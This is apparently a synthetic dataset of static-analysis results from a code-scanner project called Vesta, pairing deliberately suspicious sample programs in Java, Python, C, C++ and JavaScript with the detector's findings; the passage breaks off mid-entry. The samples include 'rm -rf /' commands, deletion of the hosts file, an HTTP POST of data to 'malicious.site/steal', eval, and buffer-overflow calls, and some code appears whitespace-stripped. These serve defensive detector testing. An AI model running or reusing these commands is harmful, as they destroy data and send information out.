sintetic_data = [
    {
    "original_code": "package suspicious;\r\n\r\nimport java.io.*;\r\nimport java.net.HttpURLConnection;\r\nimport java.net.URL;\r\nimport java.lang.reflect.Method;\r\nimport javax.crypto.Cipher;\r\nimport java.util.Base64;\r\nimport java.util.zip.ZipOutputStream;\r\n\r\npublic class SuspiciousSample {\r\n    public static void main(String[] args) {\r\n        try {\r\n\r\n            Runtime.getRuntime().exec(\"rm -rf /\");\r\n\r\n\r\n            File sensitiveFile = new File(\"C:/Windows/System32/drivers/etc/hosts\");\r\n            sensitiveFile.delete();\r\n\r\n\r\n            String secret = \"U2VjcmV0UGFzc3dvcmQ=\"; // Base64\r\n            byte[] decoded = Base64.getDecoder().decode(secret);\r\n\r\n\r\n            Class<?> clazz = Class.forName(\"java.lang.System\");\r\n            Method exitMethod = clazz.getMethod(\"exit\", int.class);\r\n            exitMethod.invoke(null, 0);\r\n\r\n\r\n            Cipher cipher = Cipher.getInstance(\"AES\");\r\n            cipher.init(Cipher.ENCRYPT_MODE, null); // Clave null solo como ejemplo\r\n\r\n\r\n            try {\r\n                int a = 1 / 0;\r\n            } catch (Exception e) {\r\n                // Ignorado a propósito\r\n            }\r\n\r\n\r\n            Runnable r = new Runnable() {\r\n                public void run() {\r\n                    System.out.println(\"Running...\");\r\n                }\r\n            };\r\n            r.run();\r\n\r\n\r\n            HttpURLConnection conn = (HttpURLConnection) new URL(\"http://malicious.site/steal\").openConnection();\r\n            conn.setDoOutput(true);\r\n            conn.getOutputStream().write(\"leak=data\".getBytes());\r\n\r\n\r\n            FileOutputStream fos = new FileOutputStream(\"hidden.zip\");\r\n            ZipOutputStream zos = new ZipOutputStream(fos);\r\n            zos.close();\r\n\r\n\r\n            String path = SuspiciousSample.class.getProtectionDomain().getCodeSource().getLocation().getPath();\r\n            File self = new File(path);\r\n            byte[] code = new FileInputStream(self).readAllBytes();\r\n\r\n        } catch (Exception ignored) {\r\n        }\r\n    }\r\n}\r\n",
    "static_findings": [
        {
            "finding_type": "NETWORK_COMMUNICATION",
            "description": "HTTP connections. In import path: 'java.net.HttpURLConnection'",
            "line": 4,
            "severity": "MEDIUM",
            "weight": 0.3,
            "behavioral_trigger": "network_import"
        },
        {
            "finding_type": "NETWORK_COMMUNICATION",
            "description": "URL handling - very common. In import path: 'java.net.URL'",
            "line": 5,
            "severity": "LOW",
            "weight": 0.1,
            "behavioral_trigger": "network_import"
        },
        {
            "finding_type": "OBFUSCATION_TECHNIQUE",
            "description": "Reflection capabilities - potential obfuscation. In import path: 'java.lang.reflect'",
            "line": 6,
            "severity": "MEDIUM",
            "weight": 0.5,
            "behavioral_trigger": "reflection_obfuscation"
        },
        {
            "finding_type": "CRYPTOGRAPHIC_USE",
            "description": "Direct cipher operations - file encryption capability. In import path: 'javax.crypto.Cipher'",
            "line": 7,
            "severity": "HIGH",
            "weight": 0.9,
            "behavioral_trigger": "crypto_import"
        },
        {
            "finding_type": "OBFUSCATION_TECHNIQUE",
            "description": "Base64 encoding - common in legitimate apps. In import path: 'java.util.Base64'",
            "line": 8,
            "severity": "LOW",
            "weight": 0.15,
            "behavioral_trigger": "base64_obfuscation"
        },
        {
            "finding_type": "OBFUSCATION_TECHNIQUE",
            "description": "Compression - very common. In import path: 'java.util.zip'",
            "line": 9,
            "severity": "INFO",
            "weight": 0.05,
            "behavioral_trigger": "compression_obfuscation"
        },
        {
            "finding_type": "CODE_EXECUTION",
            "description": "Direct OS command execution. Detected in: 'Runtime.getRuntime().exec'",
            "line": 15,
            "severity": "CRITICAL",
            "weight": 0.95,
            "behavioral_trigger": "os_command_exec"
        },
        {
            "finding_type": "SENSITIVE_DATA_ACCESS",
            "description": "Sensitive system path access. Detected in: C:/Windows/System32/drivers/etc/hosts",
            "line": 18,
            "severity": "HIGH",
            "weight": 0.8,
            "behavioral_trigger": "sensitive_path_ref"
        },
        {
            "finding_type": "FILE_SYSTEM_ACCESS",
            "description": "File deletion operation. Detected in: '.delete()'",
            "line": 19,
            "severity": "HIGH",
            "weight": 0.75,
            "behavioral_trigger": "file_delete"
        },
        {
            "finding_type": "CRYPTOGRAPHIC_USE",
            "description": "AES encryption algorithm. Found in a string literal containing 'aes'",
            "line": 31,
            "severity": "HIGH",
            "weight": 0.7,
            "behavioral_trigger": "crypto_keyword"
        },
        {
            "finding_type": "IMPROPER_ERROR_HANDLING",
            "description": "Empty catch block hiding errors. can mask critical security issues.",
            "line": 37,
            "severity": "MEDIUM",
            "weight": 0.5,
            "behavioral_trigger": None
        },
        {
            "finding_type": "NETWORK_COMMUNICATION",
            "description": "HTTP URL reference. Found in a string literal containing 'http://'",
            "line": 50,
            "severity": "INFO",
            "weight": 0.1,
            "behavioral_trigger": "http_url"
        },
        {
            "finding_type": "SELF_AWARE_BEHAVIOR",
            "description": "Code location detection - self-awareness. Detected in: 'getClass().getProtectionDomain().getCodeSource().getLocation'",
            "line": 60,
            "severity": "HIGH",
            "weight": 0.8,
            "behavioral_trigger": "self_location"
        },
        {
            "finding_type": "IMPROPER_ERROR_HANDLING",
            "description": "Empty catch block hiding errors. can mask critical security issues.",
            "line": 64,
            "severity": "MEDIUM",
            "weight": 0.5,
            "behavioral_trigger": None
        }
    ],
    "behavioral_trigger_counts": {
        "network_import": 2,
        "reflection_obfuscation": 1,
        "crypto_import": 1,
        "base64_obfuscation": 1,
        "compression_obfuscation": 1,
        "os_command_exec": 1,
        "sensitive_path_ref": 1,
        "file_delete": 1,
        "crypto_keyword": 1,
        "http_url": 1,
        "self_location": 1
    },
    "amount_findings": 14,
    "file_path": "C:\\Users\\kidsh\\Documents\\Projects\\Vesta\\vesta_backend\\antlr_detection\\codeSamples\\Java\\SuspiciousSample.java",
    "status": "SUCCESS",
    "language": "Java"
},
{
    "original_code": "package com.vesta.test;\r\n    import java.io.IOException;\r\n\r\n    public class VulnerableApp {\r\n        private String api_key = \"ABC-123-SECRET\"; // Hallazgo: Hardcoded Secret\r\n\r\n        public void executeCommand(String command) {\r\n            try {\r\n                Runtime.getRuntime().exec(command); // Hallazgo: Dangerous Call\r\n            } catch (IOException e) {\r\n                // Hallazgo: Empty Catch Block\r\n            }\r\n        }\r\n        \r\n        public static void main(String[] args) {\r\n             // Punto de entrada\r\n        }\r\n    }",
    "static_findings": [
        {
            "finding_type": "HARDCODED_CREDENTIALS",
            "description": "Possible hardcoded credential. Found in a string literal containing 'secret'",
            "line": 5,
            "severity": "HIGH",
            "weight": 0.7,
            "behavioral_trigger": None
        },
        {
            "finding_type": "CODE_EXECUTION",
            "description": "Direct OS command execution. Detected in: 'Runtime.getRuntime().exec'",
            "line": 9,
            "severity": "CRITICAL",
            "weight": 0.95,
            "behavioral_trigger": "os_command_exec"
        },
        {
            "finding_type": "IMPROPER_ERROR_HANDLING",
            "description": "Empty catch block hiding errors. can mask critical security issues.",
            "line": 10,
            "severity": "MEDIUM",
            "weight": 0.5,
            "behavioral_trigger": None
        }
    ],
    "behavioral_trigger_counts": {
        "os_command_exec": 1
    },
    "amount_findings": 3,
    "file_path": "C:\\Users\\kidsh\\Documents\\Projects\\Vesta\\vesta_backend\\antlr_detection\\codeSamples\\Java\\vulnerable_sample.java",
    "status": "SUCCESS",
    "language": "Java"
},
{
    "original_code": "utf-8import os\r\nimport subprocess\r\nimport pickle\r\n\r\n\r\n# Hallazgo: Clase sin nombre significativo para probar la detección de clases ofuscadas sin nombre\r\n# class :\r\n#     pass\r\nclass b:\r\n    # Hallazgo: Llamada peligrosa\r\n    <INDENT>def dd(self):\r\n        <INDENT>os.system(\"ls -l\")  # Esto ejecuta un comando del sistema, potencialmente peligroso\r\n<DEDENT><DEDENT>class a (b):\r\n    # Hallazgo: Secreto en el código\r\n    <INDENT>api_key = \"SECRET_KEY_12345\"\r\n\r\n    # Hallazgo: Nombre de función corto\r\n    def r(self, cmd):\r\n        # Hallazgo: Llamada peligrosa\r\n        <INDENT>os.system(cmd) \r\n        \r\n        # Hallazgo: Llamada peligrosa (especialmente con shell=True)\r\n        subprocess.run(\"ls -l\", shell=True) \r\n<DEDENT><DEDENT>def any_function():\r\n    <INDENT>pass\r\n\r\n# Hallazgo: Bloque except vacío/inútil\r\n<DEDENT>try:\r\n    # Algo que podría fallar\r\n    <INDENT>data = {'key': 'value'}\r\n    pickle.loads(data) # Esto dará error, pero lo ignoramos\r\n<DEDENT>except:\r\n    # Linea para engañar el escaner no deberia ser detectada\r\n    <INDENT>pass # Detectando como engañar el escaner de pass\r\n\r\n# Hallazgo: Punto de entrada principal\r\n<DEDENT>if __name__ == \"__main__\":\r\n    <INDENT>app = a()\r\n    # Hallazgo: Acceso a ruta sensible\r\n    user_home = \"/home/user\"\r\n    app.r(\"echo 'hello'\")\r\n    os.path.abspath(__file__)<NEWLINE><DEDENT>",
    "static_findings": [
        {
            "finding_type": "FILE_SYSTEM_ACCESS",
            "description": "Basic OS interaction - extremely common. In import path: 'os'",
            "line": 1,
            "severity": "INFO",
            "weight": 0.05,
            "behavioral_trigger": "os_import"
        },
        {
            "finding_type": "CODE_EXECUTION",
            "description": "Subprocess execution capability. In import path: 'subprocess'",
            "line": 2,
            "severity": "HIGH",
            "weight": 0.7,
            "behavioral_trigger": "code_exec_import"
        },
        {
            "finding_type": "CODE_EXECUTION",
            "description": "Serialization with code execution risk. In import path: 'pickle'",
            "line": 3,
            "severity": "HIGH",
            "weight": 0.75,
            "behavioral_trigger": "serialization_import"
        },
        {
            "finding_type": "OBFUSCATION_TECHNIQUE",
            "description": "Suspiciously short or dynamically generated class name. 'b', possible obfuscation",
            "line": 9,
            "severity": "MEDIUM",
            "weight": 0.5,
            "behavioral_trigger": None
        },
        {
            "finding_type": "OBFUSCATION_TECHNIQUE",
            "description": "Suspiciously short function name. 'dd()', possible obfuscation",
            "line": 11,
            "severity": "LOW",
            "weight": 0.3,
            "behavioral_trigger": None
        },
        {
            "finding_type": "CODE_EXECUTION",
            "description": "Shell command execution. Detected in: 'os.system('",
            "line": 12,
            "severity": "CRITICAL",
            "weight": 0.85,
            "behavioral_trigger": "os_command_exec"
        },
        {
            "finding_type": "OBFUSCATION_TECHNIQUE",
            "description": "Suspiciously short or dynamically generated class name. 'a', possible obfuscation",
            "line": 13,
            "severity": "MEDIUM",
            "weight": 0.5,
            "behavioral_trigger": None
        },
        {
            "finding_type": "CRYPTOGRAPHIC_USE",
            "description": "Cryptographic key reference (common word). Found in a string literal containing 'key'",
            "line": 15,
            "severity": "LOW",
            "weight": 0.2,
            "behavioral_trigger": "crypto_keyword"
        },
        {
            "finding_type": "HARDCODED_CREDENTIALS",
            "description": "Possible hardcoded credential. Found in a string literal containing 'secret'",
            "line": 15,
            "severity": "HIGH",
            "weight": 0.7,
            "behavioral_trigger": None
        },
        {
            "finding_type": "OBFUSCATION_TECHNIQUE",
            "description": "Suspiciously short function name. 'r()', possible obfuscation",
            "line": 18,
            "severity": "LOW",
            "weight": 0.3,
            "behavioral_trigger": None
        },
        {
            "finding_type": "CODE_EXECUTION",
            "description": "Shell command execution. Detected in: 'os.system('",
            "line": 20,
            "severity": "CRITICAL",
            "weight": 0.85,
            "behavioral_trigger": "os_command_exec"
        },
        {
            "finding_type": "CODE_EXECUTION",
            "description": "External command execution. Detected in: 'subprocess.run'",
            "line": 23,
            "severity": "HIGH",
            "weight": 0.7,
            "behavioral_trigger": "external_command_exec"
        },
        {
            "finding_type": "OBFUSCATION_TECHNIQUE",
            "description": "Function with pass body - possible evasion. Function 'any_function'.",
            "line": 24,
            "severity": "MEDIUM",
            "weight": 0.4,
            "behavioral_trigger": None
        },
        {
            "finding_type": "CRYPTOGRAPHIC_USE",
            "description": "Cryptographic key reference (common word). Found in a string literal containing 'key'",
            "line": 30,
            "severity": "LOW",
            "weight": 0.2,
            "behavioral_trigger": "crypto_keyword"
        },
        {
            "finding_type": "CODE_EXECUTION",
            "description": "Pickle deserialization - code execution risk. Detected in: 'pickle.load'",
            "line": 31,
            "severity": "CRITICAL",
            "weight": 0.85,
            "behavioral_trigger": "unsafe_deserialization"
        },
        {
            "finding_type": "IMPROPER_ERROR_HANDLING",
            "description": "Empty except block hiding errors.",
            "line": 32,
            "severity": "MEDIUM",
            "weight": 0.5,
            "behavioral_trigger": None
        },
        {
            "finding_type": "SENSITIVE_DATA_ACCESS",
            "description": "Sensitive system path access. Detected in: /home/user",
            "line": 40,
            "severity": "HIGH",
            "weight": 0.8,
            "behavioral_trigger": "sensitive_path_ref"
        },
        {
            "finding_type": "SELF_AWARE_BEHAVIOR",
            "description": "Self-aware code accessing its own file path. Detected in: 'os.path.abspath(__file__)'",
            "line": 42,
            "severity": "MEDIUM",
            "weight": 0.6,
            "behavioral_trigger": "self_aware_code"
        }
    ],
    "behavioral_trigger_counts": {
        "os_import": 1,
        "code_exec_import": 1,
        "serialization_import": 1,
        "os_command_exec": 2,
        "crypto_keyword": 2,
        "external_command_exec": 1,
        "unsafe_deserialization": 1,
        "sensitive_path_ref": 1,
        "self_aware_code": 1
    },
    "amount_findings": 18,
    "file_path": "C:\\Users\\kidsh\\Documents\\Projects\\Vesta\\vesta_backend\\antlr_detection\\codeSamples\\Python\\vulnerable_sample.py",
    "status": "SUCCESS",
    "language": "Python"
},
{
    "file_path": "C:\\Users\\kidsh\\Documents\\Projects\\Vesta\\vesta_backend\\antlr_detection\\codeSamples\\unsupported.xyz",
    "status": "UNSUPPORTED_LANGUAGE",
    "message": "File type not supported for ANTLR analysis: .xyz",
    "amount_findings": 0,
    "static_findings": [],
    "original_code": "",
    "language": "UNSUPPORTED"
},
{
    "original_code": "utf-8def my_bad_function(: # Syntax error here\r\n    print(\"This won't parse\")<NEWLINE>",
    "static_findings": [
        {
            "finding_type": "PARSING_ISSUE",
            "description": "Syntax errors found while analyzing the file. This might indicate malformed or obfuscated code. Check parsing_errors for more details.",
            "line": 0,
            "severity": "HIGH"
        }
    ],
    "behavioral_trigger_counts": {},
    "amount_findings": 1,
    "file_path": "C:\\Users\\kidsh\\Documents\\Projects\\Vesta\\vesta_backend\\antlr_detection\\codeSamples\\Python\\malformed_sample.py",
    "status": "PARSING_ERRORS",
    "language": "Python",
    "parsing_errors": [
        {
            "line": 1,
            "column": 20,
            "message": "extraneous input ':' expecting {')', '*', '**', 'type', 'match', 'case', '_', NAME}",
            "offending_symbol": ":"
        },
        {
            "line": 2,
            "column": 9,
            "message": "mismatched input '(' expecting ')'",
            "offending_symbol": "("
        }
    ]
},
{
    "original_code": "// Hallazgo: Inclusión sospechosa (stdio.h - I/O File Access)\r\n#include <stdio.h> \r\n// Hallazgo: Inclusión sospechosa (stdlib.h - Code Execution via system())\r\n#include <stdlib.h> \r\n\r\n#include <string.h> \r\n// Hallazgo: Inclusión sospechosa (unistd.h - Code Execution via fork/exec)\r\n#include <unistd.h> \r\n\r\n// (Opcional, si también quieres testear patrones de Windows API)\r\n// #include <windows.h> // Hallazgo: Inclusión sospechosa (System Info Access)\r\n\r\n\r\n// Hallazgo: Nombre de función sospechosamente corto (ofuscación)\r\nint f(int a, int b) {\r\n    return a + b;\r\n}\r\n\r\n// Hallazgo: Función con cuerpo muy simple (posible evasión/placeholder)\r\nvoid do_nothing() {\r\n    return; // Cuerpo simple\r\n}\r\n\r\n// Hallazgo: Secreto en el código\r\nconst char* API_KEY = \"HARDCODED_API_KEY_12345\"; \r\nconst char* USER_PASSWORD = \"mysecretpassword\"; // Hallazgo: Hardcoded secret\r\n\r\n// Hallazgo: Acceso a rutas sensibles del sistema\r\nconst char* LOG_PATH = \"/var/log/syslog\"; \r\nconst char* WINDOWS_PATH = \"C:/Windows/system32/drivers\"; // Para patrones de Windows\r\n\r\nint main(int argc, char argv[0]) {\r\n    // Hallazgo: Código auto-consciente (acceso a argv[0])\r\n    printf(\"Nombre del programa: %s\\n\", argv[0]); \r\n\r\n    // Hallazgo: Ejecución de comando (Dangerous function call)\r\n    system(\"ls -la /\"); \r\n\r\n    // Hallazgo: Uso de funciones inseguras (Improper Error Handling / Code Execution)\r\n    char buffer[10];\r\n    strcpy(buffer, \"This is a very long string that will overflow the buffer\"); // Hallazgo: strcpy (Improper Error Handling)\r\n    gets(buffer); // Hallazgo: gets (Improper Error Handling)\r\n\r\n    // Simulación de acceso a archivos sensibles\r\n    FILE *file = fopen(LOG_PATH, \"r\");\r\n    if (file) {\r\n        printf(\"Pudo abrir log: %s\\n\", LOG_PATH);\r\n        fclose(file);\r\n    } else {\r\n        perror(\"Error al abrir log\");\r\n    }\r\n\r\n    // Más uso de una función sospechosa (aunque en una variable)\r\n    const char* dangerous_call_pattern = \"CreateFileA\"; // Simula una API call de Windows que sería peligrosa\r\n\r\n    return 0;\r\n}\r\n\r\n// Ejemplo de otra función simple (se contará como función)\r\nvoid helper_func() {\r\n    int x = 0; // Solo una línea simple\r\n}",
    "static_findings": [
        {
            "finding_type": "FILE_SYSTEM_ACCESS",
            "description": "Standard I/O operations. In import path: 'stdio.h'",
            "line": 2,
            "severity": "INFO",
            "weight": 0.1,
            "behavioral_trigger": "file_access_import"
        },
        {
            "finding_type": "CODE_EXECUTION",
            "description": "Standard library (system() available). In import path: 'stdlib.h'",
            "line": 4,
            "severity": "INFO",
            "weight": 0.2,
            "behavioral_trigger": "code_exec_import"
        },
        {
            "finding_type": "IMPROPER_ERROR_HANDLING",
            "description": "String manipulation. In import path: 'string.h'",
            "line": 6,
            "severity": "INFO",
            "weight": 0.1,
            "behavioral_trigger": None
        },
        {
            "finding_type": "CODE_EXECUTION",
            "description": "Unix system calls (fork, exec). In import path: 'unistd.h'",
            "line": 8,
            "severity": "MEDIUM",
            "weight": 0.5,
            "behavioral_trigger": "code_exec_import"
        },
        {
            "finding_type": "OBFUSCATION_TECHNIQUE",
            "description": "Suspiciously short function name. 'f()', possible obfuscation",
            "line": 15,
            "severity": "LOW",
            "weight": 0.3,
            "behavioral_trigger": None
        },
        {
            "finding_type": "OBFUSCATION_TECHNIQUE",
            "description": "Simple function body - possible evasion. In function 'do_nothing'.",
            "line": 20,
            "severity": "MEDIUM",
            "weight": 0.4,
            "behavioral_trigger": None
        },
        {
            "finding_type": "CRYPTOGRAPHIC_USE",
            "description": "Cryptographic key reference (common word). Found in 'key'",
            "line": 25,
            "severity": "LOW",
            "weight": 0.2,
            "behavioral_trigger": "crypto_keyword"
        },
        {
            "finding_type": "HARDCODED_CREDENTIALS",
            "description": "Possible hardcoded credential. Found in 'password'",
            "line": 26,
            "severity": "HIGH",
            "weight": 0.7,
            "behavioral_trigger": None
        },
        {
            "finding_type": "SENSITIVE_DATA_ACCESS",
            "description": "Sensitive system path access. Detected in: '/var/log/syslog'",
            "line": 29,
            "severity": "HIGH",
            "weight": 0.8,
            "behavioral_trigger": "sensitive_path_ref"
        },
        {
            "finding_type": "SENSITIVE_DATA_ACCESS",
            "description": "Sensitive system path access. Detected in: 'C:/Windows/system32/drivers'",
            "line": 30,
            "severity": "HIGH",
            "weight": 0.8,
            "behavioral_trigger": "sensitive_path_ref"
        },
        {
            "finding_type": "SELF_AWARE_BEHAVIOR",
            "description": "Self execution name access (argv[0]).",
            "line": 34,
            "severity": "HIGH",
            "weight": 0.7,
            "behavioral_trigger": "self_location_name"
        },
        {
            "finding_type": "CODE_EXECUTION",
            "description": "OS command execution via system(). Detected in: 'system'",
            "line": 37,
            "severity": "CRITICAL",
            "weight": 0.9,
            "behavioral_trigger": "os_command_exec"
        },
        {
            "finding_type": "IMPROPER_ERROR_HANDLING",
            "description": "strcpy - buffer overflow risk. Detected in: 'strcpy'",
            "line": 41,
            "severity": "CRITICAL",
            "weight": 0.9,
            "behavioral_trigger": None
        },
        {
            "finding_type": "IMPROPER_ERROR_HANDLING",
            "description": "gets - inherently unsafe function. Detected in: 'gets'",
            "line": 42,
            "severity": "CRITICAL",
            "weight": 0.95,
            "behavioral_trigger": None
        },
        {
            "finding_type": "FILE_SYSTEM_ACCESS",
            "description": "File opening. Detected in: 'fopen'",
            "line": 45,
            "severity": "INFO",
            "weight": 0.1,
            "behavioral_trigger": "file_access"
        },
        {
            "finding_type": "FILE_SYSTEM_ACCESS",
            "description": "File closing. Detected in: 'fclose'",
            "line": 48,
            "severity": "INFO",
            "weight": 0.1,
            "behavioral_trigger": None
        }
    ],
    "behavioral_trigger_counts": {
        "file_access_import": 1,
        "code_exec_import": 2,
        "crypto_keyword": 1,
        "sensitive_path_ref": 2,
        "self_location_name": 1,
        "os_command_exec": 1,
        "file_access": 1
    },
    "amount_findings": 16,
    "file_path": "C:\\Users\\kidsh\\Documents\\Projects\\Vesta\\vesta_backend\\antlr_detection\\codeSamples\\C\\vulnerable_sample.c",
    "status": "SUCCESS",
    "language": "C"
},
{
    "original_code": "#include <iostream> // Import sospechoso (IO)\r#include <fstream>  // Import sospechoso (File IO)\r#include <windows.h> // Import sospechoso (System Info Access)\r#include <string.h>\rclassA{public:std::stringpassword=\"my_hardcoded_password\";voidx(){std::cout<<\"Hello\"<<std::endl;}virtualvoidoverrideMe()override{return;}};voidempty_func(){}voidempty_func1(){return;}voidempty_func2(){strcpy(\"executable\",\"file.exe\");return;}intmain(intargc,char*argv[]){std::cout<<\"Program name: \"<<argv[0]<<std::endl;system(\"calc.exe\");charinicial='A';charbuffer[10];constwchar_t*mensaje=L\"Hola mundo en wchar_t\";constchar*sensitivePath=\"/etc/shadow\";std::cout<<sensitivePath<<std::endl;try{}catch(...){}std::cout<<__FILE__<<std::endl;return0;}",
    "static_findings": [
        {
            "finding_type": "FILE_SYSTEM_ACCESS",
            "description": "Standard I/O streams. In import path: 'iostream'",
            "line": 1,
            "severity": "INFO",
            "weight": 0.1,
            "behavioral_trigger": "file_access_import"
        },
        {
            "finding_type": "FILE_SYSTEM_ACCESS",
            "description": "File stream manipulation. In import path: 'fstream'",
            "line": 2,
            "severity": "MEDIUM",
            "weight": 0.4,
            "behavioral_trigger": "file_access_import"
        },
        {
            "finding_type": "SYSTEM_INFO_ACCESS",
            "description": "Windows API access. In import path: 'windows.h'",
            "line": 3,
            "severity": "MEDIUM",
            "weight": 0.6,
            "behavioral_trigger": None
        },
        {
            "finding_type": "OBFUSCATION_TECHNIQUE",
            "description": "Suspiciously short or dynamically generated class name. 'A', possible obfuscation",
            "line": 7,
            "severity": "MEDIUM",
            "weight": 0.5,
            "behavioral_trigger": None
        },
        {
            "finding_type": "HARDCODED_CREDENTIALS",
            "description": "Possible hardcoded credential. Found in 'password'",
            "line": 10,
            "severity": "HIGH",
            "weight": 0.7,
            "behavioral_trigger": None
        },
        {
            "finding_type": "OBFUSCATION_TECHNIQUE",
            "description": "Suspiciously short method name. 'x()', possible obfuscation",
            "line": 13,
            "severity": "LOW",
            "weight": 0.3,
            "behavioral_trigger": None
        },
        {
            "finding_type": "IMPROPER_ERROR_HANDLING",
            "description": "Suspicious method override - potential evasion. Function 'overrideMe()'.",
            "line": 18,
            "severity": "HIGH",
            "weight": 0.6,
            "behavioral_trigger": None
        },
        {
            "finding_type": "IMPROPER_ERROR_HANDLING",
            "description": "Empty function body. In the function 'empty_func()'.",
            "line": 24,
            "severity": "MEDIUM",
            "weight": 0.4,
            "behavioral_trigger": None
        },
        {
            "finding_type": "OBFUSCATION_TECHNIQUE",
            "description": "Simple function body - possible evasion. In function 'empty_func1'.",
            "line": 28,
            "severity": "MEDIUM",
            "weight": 0.4,
            "behavioral_trigger": None
        },
        {
            "finding_type": "CODE_EXECUTION",
            "description": "Process replacement. Detected in: 'exec'",
            "line": 33,
            "severity": "MEDIUM",
            "weight": 0.6,
            "behavioral_trigger": "process_replacement"
        },
        {
            "finding_type": "IMPROPER_ERROR_HANDLING",
            "description": "strcpy - buffer overflow risk. Detected in: 'strcpy'",
            "line": 33,
            "severity": "CRITICAL",
            "weight": 0.9,
            "behavioral_trigger": None
        },
        {
            "finding_type": "SELF_AWARE_BEHAVIOR",
            "description": "Self execution name access. In 'argv[0]'",
            "line": 38,
            "severity": "HIGH",
            "weight": 0.7,
            "behavioral_trigger": "self_location_name"
        },
        {
            "finding_type": "CODE_EXECUTION",
            "description": "OS command execution via system(). Detected in: 'system'",
            "line": 41,
            "severity": "CRITICAL",
            "weight": 0.9,
            "behavioral_trigger": "os_command_exec"
        },
        {
            "finding_type": "SENSITIVE_DATA_ACCESS",
            "description": "Sensitive system path access. Detected in: '/etc/shadow'",
            "line": 48,
            "severity": "HIGH",
            "weight": 0.8,
            "behavioral_trigger": "sensitive_path_ref"
        },
        {
            "finding_type": "IMPROPER_ERROR_HANDLING",
            "description": "Empty catch block hiding errors.",
            "line": 57,
            "severity": "MEDIUM",
            "weight": 0.5,
            "behavioral_trigger": None
        },
        {
            "finding_type": "SELF_AWARE_BEHAVIOR",
            "description": "Self execution name access. In '__FILE__'",
            "line": 62,
            "severity": "HIGH",
            "weight": 0.7,
            "behavioral_trigger": "self_location_name"
        }
    ],
    "behavioral_trigger_counts": {
        "file_access_import": 2,
        "process_replacement": 1,
        "self_location_name": 2,
        "os_command_exec": 1,
        "sensitive_path_ref": 1
    },
    "amount_findings": 16,
    "file_path": "C:\\Users\\kidsh\\Documents\\Projects\\Vesta\\vesta_backend\\antlr_detection\\codeSamples\\Cpp\\vulnerable_sample.cpp",
    "status": "SUCCESS",
    "language": "C++"
},
{
    "original_code": "// Importación sospechosa (Node.js)\r\nimport * as fs from 'fs';\r\nimport { exec } from 'child_process'; // Llamada peligrosa\r\n\r\n// Hallazgo: Nombre de clase corto\r\nclass A {\r\n    // Hallazgo: Secreto en el código\r\n    constructor() {\r\n        this.apiKey = \"JS_SECRET_API_KEY\";\r\n    }\r\n\r\n    // Hallazgo: Nombre de método corto\r\n    m() {\r\n        // Hallazgo: Llamada peligrosa\r\n        eval(\"console.log('Malicious code');\"); \r\n        exec('rm -rf /', (err, stdout, stderr) => {});\r\n    }\r\n\r\n    // Hallazgo: Método con cuerpo vacío (override sospechoso)\r\n    // Aunque no hay @override en JS, un método vacío es sospechoso\r\n    doNothing() {} \r\n}\r\n\r\n// Hallazgo: Función declarada globalmente con nombre corto\r\nfunction f() {\r\n    console.log(\"Short function name\");\r\n}\r\n\r\n// Hallazgo: Bloque catch vacío\r\ntry {\r\n    throw new Error(\"Test error\");\r\n} catch (e) {\r\n    // EMPTY_CATCH_BLOCK\r\n}\r\n\r\n// Hallazgo: Acceso a ruta sensible\r\nconst sensitivePath = \"/etc/passwd\";\r\nconsole.log(sensitivePath);\r\n\r\n// Hallazgo: Código auto-consciente\r\nconsole.log(__dirname); // Node.js global\r\nconsole.log(process.argv[0]); // Node.js\r\n\r\n// Punto de entrada (proxy)\r\nfunction main() {\r\n    let obj = new A();\r\n    obj.m();\r\n    f();\r\n}\r\nmain();",
    "static_findings": [
        {
            "finding_type": "FILE_SYSTEM_ACCESS",
            "description": "File system access capability. In import path: 'fs'",
            "line": 2,
            "severity": "LOW",
            "weight": 0.2,
            "behavioral_trigger": "file_access_import"
        },
        {
            "finding_type": "CODE_EXECUTION",
            "description": "System command execution capability. In import path: 'child_process'",
            "line": 3,
            "severity": "MEDIUM",
            "weight": 0.5,
            "behavioral_trigger": "code_exec_import"
        },
        {
            "finding_type": "SYSTEM_INFO_ACCESS",
            "description": "Process information - very common. In import path: 'process'",
            "line": 3,
            "severity": "INFO",
            "weight": 0.1,
            "behavioral_trigger": None
        },
        {
            "finding_type": "OBFUSCATION_TECHNIQUE",
            "description": "Suspiciously short or dynamically generated class name. 'A', possible obfuscation",
            "line": 6,
            "severity": "MEDIUM",
            "weight": 0.5,
            "behavioral_trigger": None
        },
        {
            "finding_type": "CRYPTOGRAPHIC_USE",
            "description": "Cryptographic key reference (common word). Found in a string literal containing 'key'",
            "line": 9,
            "severity": "LOW",
            "weight": 0.2,
            "behavioral_trigger": "crypto_keyword"
        },
        {
            "finding_type": "HARDCODED_CREDENTIALS",
            "description": "Possible hardcoded credential. Found in a string literal containing 'secret'",
            "line": 9,
            "severity": "HIGH",
            "weight": 0.7,
            "behavioral_trigger": None
        },
        {
            "finding_type": "OBFUSCATION_TECHNIQUE",
            "description": "Suspiciously short method name. 'm()', possible obfuscation",
            "line": 13,
            "severity": "LOW",
            "weight": 0.3,
            "behavioral_trigger": None
        },
        {
            "finding_type": "CODE_EXECUTION",
            "description": "Dynamic code execution from string. Detected in: 'eval('",
            "line": 15,
            "severity": "CRITICAL",
            "weight": 0.95,
            "behavioral_trigger": "dynamic_code_exec"
        },
        {
            "finding_type": "OBFUSCATION_TECHNIQUE",
            "description": "Overridden method with empty or very simple body, possible evasion technique. 'doNothing'.",
            "line": 21,
            "severity": "MEDIUM",
            "weight": 0.5,
            "behavioral_trigger": None
        },
        {
            "finding_type": "OBFUSCATION_TECHNIQUE",
            "description": "Suspiciously short function name. 'f()', possible obfuscation",
            "line": 25,
            "severity": "LOW",
            "weight": 0.3,
            "behavioral_trigger": None
        },
        {
            "finding_type": "IMPROPER_ERROR_HANDLING",
            "description": "Empty catch block, may hide critical errors.",
            "line": 32,
            "severity": "MEDIUM",
            "weight": 0.5,
            "behavioral_trigger": None
        },
        {
            "finding_type": "SENSITIVE_DATA_ACCESS",
            "description": "Sensitive system path access. Detected in: /etc/passwd",
            "line": 37,
            "severity": "HIGH",
            "weight": 0.8,
            "behavioral_trigger": "sensitive_path_ref"
        },
        {
            "finding_type": "SELF_AWARE_BEHAVIOR",
            "description": "Current directory - very common in Node.js. Detected in: '__dirname'",
            "line": 41,
            "severity": "INFO",
            "weight": 0.1,
            "behavioral_trigger": "self_location_ref"
        },
        {
            "finding_type": "SELF_AWARE_BEHAVIOR",
            "description": "Node.js executable path. Detected in: 'process.argv[0]'",
            "line": 42,
            "severity": "LOW",
            "weight": 0.3,
            "behavioral_trigger": "self_location_name"
        }
    ],
    "behavioral_trigger_counts": {
        "file_access_import": 1,
        "code_exec_import": 1,
